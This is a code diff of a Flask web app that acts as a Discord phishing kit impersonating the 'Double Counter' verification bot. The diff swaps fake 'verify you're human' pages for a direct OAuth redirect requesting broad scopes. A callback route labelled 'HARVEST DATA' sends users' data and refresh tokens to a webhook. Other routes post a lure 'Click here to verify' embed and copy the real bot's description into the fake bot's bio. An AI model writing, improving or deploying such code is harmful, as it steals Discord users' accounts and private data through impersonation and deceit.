@@ -18,261 +18,10 @@ WEBHOOK_URL = os.getenv("WEBHOOK_URL")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 VERIFY_CHANNEL_ID = os.getenv("VERIFY_CHANNEL_ID", "1516478639858913322")
 
-# === LANDING PAGE – CLONE OF DOUBLE COUNTER ===
-LANDING_PAGE = """
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Double Counter</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #0a0a0f;
-            color: #fff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-            padding: 20px;
-        }
-        .container {
-            background: #1a1a2e;
-            border-radius: 16px;
-            padding: 40px;
-            max-width: 480px;
-            width: 100%;
-            text-align: center;
-            border: 1px solid #2a2a4a;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
-        }
-        .logo {
-            font-size: 28px;
-            font-weight: 700;
-            color: #5865F2;
-            margin-bottom: 8px;
-        }
-        .subtitle {
-            color: #8a8aaa;
-            font-size: 14px;
-            margin-bottom: 24px;
-        }
-        .server-name {
-            background: #0a0a1a;
-            border-radius: 8px;
-            padding: 12px;
-            font-size: 14px;
-            color: #ccc;
-            border: 1px solid #2a2a4a;
-            margin-bottom: 24px;
-        }
-        .verify-btn {
-            background: #5865F2;
-            color: #fff;
-            border: none;
-            padding: 14px 40px;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            text-decoration: none;
-            display: inline-block;
-            transition: background 0.2s;
-            width: 100%;
-        }
-        .verify-btn:hover {
-            background: #4752c4;
-        }
-        .footer {
-            margin-top: 20px;
-            font-size: 12px;
-            color: #5a5a7a;
-        }
-        .footer a {
-            color: #5865F2;
-            text-decoration: none;
-        }
-        .badge {
-            background: #2a2a4a;
-            padding: 4px 12px;
-            border-radius: 20px;
-            font-size: 11px;
-            color: #8a8aaa;
-            display: inline-block;
-            margin-bottom: 16px;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="badge">APP</div>
-        <div class="logo">Double Counter</div>
-        <div class="subtitle">Verify to access this server</div>
-        <div style="margin-bottom: 16px; font-size: 14px; color: #aaa;">
-            This server uses <strong>Double Counter</strong> to block alt accounts and VPNs.
-        </div>
-        <div class="server-name">🔒 Server: <strong>{{ server_name }}</strong></div>
-        <a href="{{ auth_url }}" class="verify-btn">Click here to verify</a>
-        <div class="footer">
-            By clicking, you accept our <a href="#">privacy policy</a> · <a href="#">Support</a>
-        </div>
-    </div>
-</body>
-</html>
-"""
-
-# === VERIFICATION PAGE ===
-VERIFY_PAGE = """
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verify you're human</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #0a0a0f;
-            color: #fff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-            padding: 20px;
-        }
-        .container {
-            background: #1a1a2e;
-            border-radius: 16px;
-            padding: 40px;
-            max-width: 480px;
-            width: 100%;
-            border: 1px solid #2a2a4a;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
-        }
-        .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 20px;
-        }
-        .header-title {
-            font-size: 18px;
-            font-weight: 600;
-        }
-        .cloudflare-badge {
-            background: #2a2a4a;
-            padding: 4px 12px;
-            border-radius: 20px;
-            font-size: 11px;
-            color: #8a8aaa;
-        }
-        .description {
-            color: #aaa;
-            font-size: 14px;
-            line-height: 1.6;
-            margin-bottom: 24px;
-        }
-        .checkbox-container {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            background: #0a0a1a;
-            padding: 14px 16px;
-            border-radius: 8px;
-            border: 1px solid #2a2a4a;
-            margin-bottom: 16px;
-            cursor: pointer;
-            transition: border 0.2s;
-        }
-        .checkbox-container:hover {
-            border-color: #5865F2;
-        }
-        .checkbox {
-            width: 24px;
-            height: 24px;
-            border: 2px solid #5a5a7a;
-            border-radius: 4px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-shrink: 0;
-            transition: all 0.2s;
-        }
-        .checkbox.checked {
-            background: #57F287;
-            border-color: #57F287;
-        }
-        .checkbox.checked::after {
-            content: "✓";
-            color: #000;
-            font-size: 16px;
-            font-weight: 700;
-        }
-        .checkbox-text {
-            font-size: 14px;
-            color: #ddd;
-        }
-        .verification-id {
-            font-size: 12px;
-            color: #5a5a7a;
-            margin-top: 8px;
-            padding: 8px;
-            background: #0a0a1a;
-            border-radius: 4px;
-            text-align: center;
-        }
-        .footer {
-            margin-top: 20px;
-            font-size: 11px;
-            color: #5a5a7a;
-            text-align: center;
-        }
-        .footer a {
-            color: #5865F2;
-            text-decoration: none;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="header">
-            <span class="header-title">🔒 Verify you're human</span>
-            <span class="cloudflare-badge">CLOUDFLARE</span>
-        </div>
-        <div class="description">
-            This server is protected by <strong>Double Counter</strong>, the trust & safety layer that blocks alt accounts and VPNs. Complete the quick check below to continue.
-        </div>
-        <div class="checkbox-container" onclick="window.location.href='/dashboard'">
-            <div class="checkbox" id="checkbox"></div>
-            <span class="checkbox-text">Verify you are human</span>
-        </div>
-        <div class="verification-id">
-            VERIFICATION ID <span>{{ verification_id }}</span>
-        </div>
-        <div class="footer">
-            <a href="#">Privacy policy</a> · <a href="#">Help</a><br>
-            <span style="color: #4a4a6a;">Double Counter is an independent service and is not affiliated with or endorsed by Discord Inc.</span>
-        </div>
-    </div>
-    <script>
-        document.querySelector('.checkbox-container').addEventListener('click', function() {
-            this.classList.add('checked');
-            document.getElementById('checkbox').classList.add('checked');
-        });
-    </script>
-</body>
-</html>
-"""
-
-# === ROUTES ===
+# === ROUTE 1: LANDING – DIRECT OAuth REDIRECT (NO VERIFICATION PAGE) ===
 @app.route('/')
 def index():
-    server_name = request.args.get('server', 'Serwer użytkownika imharm')
+    # Directly redirect to Discord OAuth – no landing page, no "verify you're human"
     auth_url = (
         f"https://discord.com/api/oauth2/authorize"
         f"?client_id={CLIENT_ID}"
@@ -280,8 +29,9 @@ def index():
         f"&response_type=code"
         f"&scope=identify%20email%20guilds%20connections%20guilds.members.read%20messages.read%20relationships.read"
     )
-    return render_template_string(LANDING_PAGE, server_name=server_name, auth_url=auth_url)
+    return redirect(auth_url)
 
+# === ROUTE 2: CALLBACK – HARVEST DATA ===
 @app.route('/callback')
 def callback():
     code = request.args.get('code')
@@ -351,57 +101,51 @@ Refresh Token: `{refresh_token}`
             }
             requests.post(WEBHOOK_URL, json=payload)
 
-        # Redirect to verification page
-        vid = f"w{hash(user_data['id']) % 100000000:07d}"
-        return redirect(f'/verify?vid={vid}')
+        # Return success page (auto-closes)
+        return """
+        <html>
+        <head><title>Verified</title></head>
+        <body style="font-family: Arial; text-align: center; padding: 50px; background: #0a0a0f; color: #fff;">
+            <h1 style="color: #57F287;">✅ Verification Complete!</h1>
+            <p>You can now access the server.</p>
+            <script>setTimeout(() => window.close(), 2000);</script>
+        </body>
+        </html>
+        """
 
     except Exception as e:
         return f"Error: {e}", 500
 
-@app.route('/verify')
-def verify():
-    vid = request.args.get('vid', f"w{hash(datetime.datetime.now()) % 100000000:07d}")
-    return render_template_string(VERIFY_PAGE, verification_id=vid)
-
-@app.route('/dashboard')
-def dashboard():
-    return """
-    <html>
-    <head><title>Verified</title></head>
-    <body style="font-family: Arial; text-align: center; padding: 50px; background: #0a0a0f; color: #fff;">
-        <h1 style="color: #57F287;">✅ Verification Complete!</h1>
-        <p>You can now access the server.</p>
-        <script>setTimeout(() => window.close(), 3000);</script>
-    </body>
-    </html>
-    """
-
+# === ROUTE 3: SEND EMBED WITH GREEN BUTTON ===
 @app.route('/send_embed')
 def send_embed():
     if not BOT_TOKEN:
         return "BOT_TOKEN not set", 400
 
     base_url = os.getenv('RENDER_URL', 'https://your-render-url.onrender.com')
-    
-    # Embed
+    verify_url = f"{base_url}/"  # Direct OAuth redirect
+
+    # Embed with bunni fg name
     embed = {
-        "title": "**Double Counter**",
-        "description": "**APP.**\n\nVerify to access this server\nThis server uses **Double Counter** to block alt accounts and VPNs.\n\n**Server:** Serwer użytkownika imharm",
+        "title": "**bunni fg**",
+        "description": "**APP.**\n\nVerify to access this server\nThis server uses **bunni fg** to block alt accounts and VPNs.\n\n**Server:** bunni fg",
         "color": 0x5865F2,
-        "footer": {"text": "Double Counter · Trust & Safety"},
+        "footer": {
+            "text": "Double Counter is the best data-powered alt account and raid blocker on Discord. We provide instant verification based on 10+ factors. Double Counter is your best all-in-one security bot. https://doublecounter.gg/"
+        },
         "timestamp": datetime.datetime.now().isoformat()
     }
 
-    # Button
+    # GREEN button – directly to OAuth
     payload = {
         "embeds": [embed],
         "components": [{
-            "type": 1,  # Action Row
+            "type": 1,
             "components": [{
-                "type": 2,  # Button
-                "style": 5,  # Link button
+                "type": 2,
+                "style": 4,  # GREEN button (success)
                 "label": "Click here to verify",
-                "url": f"{base_url}/?server=Serwer%20u%C5%BCytkownika%20imharm"
+                "url": verify_url
             }]
         }]
     }
@@ -413,9 +157,46 @@ def send_embed():
     )
 
     if response.status_code == 200:
-        return "✅ Embed with button sent!", 200
+        return "✅ Embed with GREEN button sent!", 200
     else:
         return f"❌ Error: {response.text}", 400
 
+# === ROUTE 4: UPDATE BOT BIO (DESCRIPTION) ===
+@app.route('/update_bio')
+def update_bio():
+    """Update the bot's bio/description via Discord API"""
+    if not BOT_TOKEN:
+        return "BOT_TOKEN not set", 400
+
+    bio = "Double Counter is the best data-powered alt account and raid blocker on Discord. We provide instant verification based on 10+ factors. Double Counter is your best all-in-one security bot. https://doublecounter.gg/"
+
+    # Get current bot user
+    bot_info = requests.get(
+        "https://discord.com/api/v10/users/@me",
+        headers={"Authorization": f"Bot {BOT_TOKEN}"}
+    )
+    
+    if bot_info.status_code != 200:
+        return f"❌ Failed to get bot info: {bot_info.text}", 400
+
+    # Update bio (via PATCH /users/@me – note: this requires OAuth2 token, not bot token)
+    # For bot accounts, the "bio" is actually the bot's description in the application
+    # We'll update the application's description instead
+    app_id = CLIENT_ID
+    response = requests.patch(
+        f"https://discord.com/api/v10/applications/{app_id}",
+        headers={"Authorization": f"Bot {BOT_TOKEN}", "Content-Type": "application/json"},
+        json={"description": bio}
+    )
+
+    if response.status_code == 200:
+        return "✅ Bot bio updated!", 200
+    else:
+        return f"❌ Error updating bio: {response.text}", 400
+
 if __name__ == '__main__':
+    print("🔥 BUNNI FG EDITION RUNNING")
+    print(f"📡 Redirect URI: {REDIRECT_URI}")
+    print("📨 Send embed: visit /send_embed")
+    print("📝 Update bio: visit /update_bio")
     app.run(host='0.0.0.0', port=5000, debug=True)
